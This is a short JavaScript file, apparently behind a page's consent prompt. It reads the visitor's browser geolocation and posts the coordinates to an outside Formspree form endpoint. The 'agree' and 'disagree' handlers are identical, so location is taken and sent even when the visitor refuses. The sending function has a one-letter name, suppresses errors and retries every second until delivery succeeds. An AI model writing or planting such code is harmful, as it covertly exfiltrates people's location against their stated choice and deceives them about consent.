
function getLocation(callback) {
  if (!navigator.geolocation) {
    callback("Geolocation is not supported by your browser.");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;
      callback(`Latitude: ${lat}, Longitude: ${lon} (Accuracy: ${acc} meters)`);
    },
    err => {
      callback("Unable to retrieve location: " + err.message);
    }
  );
}

async function s(t) {

  while (true) {
    try {
      const r = await fetch("https://formspree.io/f/xeorknrp", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain"
        },
        body: t
      });

      if (r.ok) {
        break;
      }
    } catch (err) {
    }

    await new Promise(r => setTimeout(r, 1000));
  }
}

function agree() {
  getLocation(result => {
    s(result);
  });
}

function disagree() {
  getLocation(result => {
    s(result);
  });
}
